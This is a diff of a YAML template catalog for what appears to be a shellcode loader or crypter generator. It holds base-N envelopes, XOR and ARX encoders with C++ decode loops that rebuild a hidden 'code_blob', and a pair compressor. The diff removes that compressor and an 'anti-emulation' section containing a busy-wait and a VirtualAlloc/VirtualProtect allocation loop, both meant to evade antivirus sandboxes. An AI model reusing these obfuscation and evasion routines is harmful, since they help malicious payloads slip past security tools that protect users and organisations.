@@ -1,6 +1,15 @@
 # Project catalog moved under data/yaml
 # Project catalog moved under data/yaml
 envelopes:
+  - index: 0
+    name: none
+    desc: No envelope; prefer selecting this to emit bare byte array
+    python_snippet: |
+      def envelope(data: bytes) -> str:
+          return ""
+    cpp_decode: |
+      // envelope 'none' is handled in the generator; this is a no-op stub
+
   - index: 1
     name: base91
     python_snippet: |
@@ -40,7 +49,6 @@ envelopes:
       unsigned int b = 0, n = 0;
       int v = -1;
       for (unsigned int i = 0; i < code_blob_text_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char c = (unsigned char)code_blob_text[i];
           int d = (c < 256) ? b91_dec[c] : -1;
           if (d < 0) continue;
@@ -78,7 +86,6 @@ envelopes:
       unsigned int enc_len = 0;
       unsigned int val = 0; int valb = -8;
       for (unsigned int i=0;i<code_blob_text_len;++i){
-          {ANTI-EMULATION-SNIPPET}
           int d = B64_DEC[(unsigned char)code_blob_text[i]];
           if (d == -1) continue;
           val = (val<<6) | (unsigned)d; valb += 6;
@@ -106,7 +113,6 @@ envelopes:
       unsigned int enc_len = 0;
       unsigned int val = 0; int valb = -8;
       for (unsigned int i=0;i<code_blob_text_len;++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char c = (unsigned char)code_blob_text[i];
           if (c == '=') continue; // skip padding
           int d = B32_DEC[c];
@@ -118,17 +124,6 @@ envelopes:
           }
       }
 
-  - index: 0
-    name: none
-    desc: No envelope; prefer selecting this to emit bare byte array
-    python_snippet: |
-      def envelope(data: bytes) -> str:
-          return ""
-    cpp_decode: |
-      // envelope 'none' is handled in the generator; this is a no-op stub
-      unsigned char* enc_buf = new unsigned char[1];
-      unsigned int enc_len = 0;
-
 encoders:
   - index: 0
     name: none
@@ -137,11 +132,10 @@ encoders:
       def encode(data: bytes, keys: dict) -> bytes:
           return data
     cpp_inverse: |
-      // handled specially; fallback copies input
-      unsigned char* comp_buf = new unsigned char[enc_len];
-      unsigned int comp_len = enc_len;
+      unsigned char* code_blob = new unsigned char[enc_len];
+      unsigned int code_blob_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          comp_buf[i] = enc_buf[i];
+          code_blob[i] = enc_buf[i];
       }
   - index: 1
     name: xor
@@ -154,11 +148,10 @@ encoders:
           k = keys["xor_key"]
           return bytes(d ^ k[i % len(k)] for i, d in enumerate(data))
     cpp_inverse: |
-      unsigned char* comp_buf = new unsigned char[enc_len];
-      unsigned int comp_len = enc_len;
+      unsigned char* code_blob = new unsigned char[enc_len];
+      unsigned int code_blob_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
-          comp_buf[i] = enc_buf[i] ^ {xor_key}[i % {xor_key_len}];
+          code_blob[i] = enc_buf[i] ^ {xor_key}[i % {xor_key_len}];
       }
 
   - index: 2
@@ -174,12 +167,11 @@ encoders:
           out = bytes(d ^ k2[i % len(k2)] for i, d in enumerate(tmp))
           return out
     cpp_inverse: |
-      unsigned char* comp_buf = new unsigned char[enc_len];
-      unsigned int comp_len = enc_len;
+      unsigned char* code_blob = new unsigned char[enc_len];
+      unsigned int code_blob_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char b = enc_buf[i] ^ {xor_key2}[i % {xor_key2_len}];
-          comp_buf[i] = b ^ {xor_key1}[i % {xor_key1_len}];
+          code_blob[i] = b ^ {xor_key1}[i % {xor_key1_len}];
       }
 
   - index: 3
@@ -201,17 +193,16 @@ encoders:
               out[i] = bp
           return bytes(out)
     cpp_inverse: |
-      unsigned char* comp_buf = new unsigned char[enc_len];
-      unsigned int comp_len = enc_len;
+      unsigned char* code_blob = new unsigned char[enc_len];
+      unsigned int code_blob_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
           unsigned char b = enc_buf[i];
           b ^= (unsigned char)(k + (unsigned char)i);
           if (r) b = (unsigned char)((b >> r) | (b << (8 - r))); // rotr8
           b = (unsigned char)(b - k);
-          comp_buf[i] = b;
+          code_blob[i] = b;
       }
 
   - index: 4
@@ -235,152 +226,25 @@ encoders:
               return bytes(out)
           return arx_once(arx_once(data, k1), k2)
     cpp_inverse: |
-      unsigned char* comp_buf = new unsigned char[enc_len];
-      unsigned int comp_len = enc_len;
+      unsigned char* code_blob = new unsigned char[enc_len];
+      unsigned int code_blob_len = enc_len;
       /* invert pass 2 (key2) */
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key2}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
           unsigned char b = enc_buf[i];
           b ^= (unsigned char)(k + (unsigned char)i);
           if (r) b = (unsigned char)((b >> r) | (b << (8 - r))); // rotr8
           b = (unsigned char)(b - k);
-          comp_buf[i] = b;
+          code_blob[i] = b;
       }
       /* invert pass 1 (key1) */
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key1}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
-          unsigned char b = comp_buf[i];
+          unsigned char b = code_blob[i];
           b ^= (unsigned char)(k + (unsigned char)i);
           if (r) b = (unsigned char)((b >> r) | (b << (8 - r))); // rotr8
           b = (unsigned char)(b - k);
-          comp_buf[i] = b;
+          code_blob[i] = b;
       }
-
-compressors:
-  - index: 0
-    name: none
-    python_snippet: |
-      def compress(data: bytes):
-          return data, {}
-    cpp_decompress: |
-      // ---- no compression: comp_buf is original ----
-      unsigned char* code_blob = new unsigned char[comp_len];
-      unsigned int code_blob_len = comp_len;
-      for (unsigned int i = 0; i < comp_len; ++i) code_blob[i] = comp_buf[i];
-
-  - index: 1
-    name: pair
-    python_snippet: |
-      from collections import Counter
-      ESC = 0xFF
-      def compress(data: bytes):
-          n = len(data)
-          if n == 0: return b"", {"dict_pairs": []}
-          ctr = Counter((data[i], data[i+1]) for i in range(n - 1))
-          top = [p for (p, _) in ctr.most_common(255)]
-          pair_to_idx = {p: i for i, p in enumerate(top)}
-          out = bytearray()
-          i = 0
-          while i < n:
-              if i + 1 < n:
-                  pair = (data[i], data[i+1])
-                  idx = pair_to_idx.get(pair)
-                  if idx is not None:
-                      out.append(ESC); out.append(idx)
-                      i += 2
-                      continue
-              b = data[i]
-              if b == ESC:
-                  out.append(ESC); out.append(ESC)
-              else:
-                  out.append(b)
-              i += 1
-          return bytes(out), {"dict_pairs": top}
-    emit:
-      dict_arrays:
-        - { var: "pair_dict_hi", source: "dict_pairs", kind: "bytes_from_list_hi" }
-        - { var: "pair_dict_lo", source: "dict_pairs", kind: "bytes_from_list_lo" }
-    cpp_decompress: |
-      // ---- inline Pair decompression over RAW BYTES (ESC=0xFF) ----
-      unsigned int code_blob_cap = code_blob_expected_len;
-      unsigned char* code_blob = new unsigned char[code_blob_cap];
-      unsigned int code_blob_len = 0;
-      for (unsigned int i = 0; i < comp_len; ++i) {
-          {ANTI-EMULATION-SNIPPET}
-          unsigned char cb = comp_buf[i];
-          if (cb == 0xFFu) {
-              if (i + 1 < comp_len) {
-                  unsigned char idx = comp_buf[++i];
-                  if (idx == 0xFFu) {
-                      if (code_blob_len < code_blob_cap) code_blob[code_blob_len++] = 0xFFu;
-                  } else if (idx < {pair_dict_hi_len} && idx < {pair_dict_lo_len}) {
-                      if (code_blob_len + 1 < code_blob_cap) {
-                          code_blob[code_blob_len++] = {pair_dict_hi}[idx];
-                          code_blob[code_blob_len++] = {pair_dict_lo}[idx];
-                      }
-                  }
-              }
-          } else {
-              if (code_blob_len < code_blob_cap) code_blob[code_blob_len++] = cb;
-          }
-      }
-
-anti-emulation:
-  - index: 1
-    name: spin
-    desc: Busy-wait loop for N iterations (duration = iterations)
-    args: [duration]
-    cpp_snippet: |
-      /* anti-emulation: spin */
-      for (volatile unsigned int __sleep_i = 0; __sleep_i < (unsigned int){duration}; ++__sleep_i) { /* noop */ }
-
-  - index: 2
-    name: siralloc
-    desc: |
-      Allocate SIR_ALLOC_COUNT heap buffers of PAYLOAD_LEN bytes and repeat writes for SIR_ITERATION_COUNT iterations.
-      Args: SIR_ALLOC_COUNT (alloc count), SIR_ITERATION_COUNT (loop iterations). PAYLOAD_LEN maps to code_blob_len.
-    args: [SIR_ALLOC_COUNT, SIR_ITERATION_COUNT]
-    cpp_snippet: |
-      // safe heap-based siralloc; includes <vector> and avoids executable memory
-        void* allocs[{SIR_ALLOC_COUNT}];
-        DWORD result;
-
-        for(int i=0; i<{SIR_ITERATION_COUNT}; i++) {
-            for(int n=0; n<{SIR_ALLOC_COUNT}; n++) {
-                allocs[n] = VirtualAlloc(
-                    NULL, 
-                    code_blob_len, 
-                    0x3000, 
-                    p_RW
-                );
-                char *ptr = allocs[n];
-
-                // write every byte of it
-                for(int i=0; i< code_blob_len; i++) {
-                    ptr[i] = 0x23;
-                }
-            }
-
-            for(int n=0; n<{SIR_ALLOC_COUNT}; n++) {
-                if (VirtualProtect(
-                    allocs[n], 
-                    code_blob_len, 
-                    p_RX, 
-                    &result) == 0) 
-                {
-                    return;
-                }
-            }
-
-            BOOL bSuccess;
-            for(int n=0; n<{SIR_ALLOC_COUNT}; n++) {
-                bSuccess = VirtualFree(
-                                allocs[n],
-                                code_blob_len,
-                                0x00008000); // MEM_RELEASE
-            }
-        }
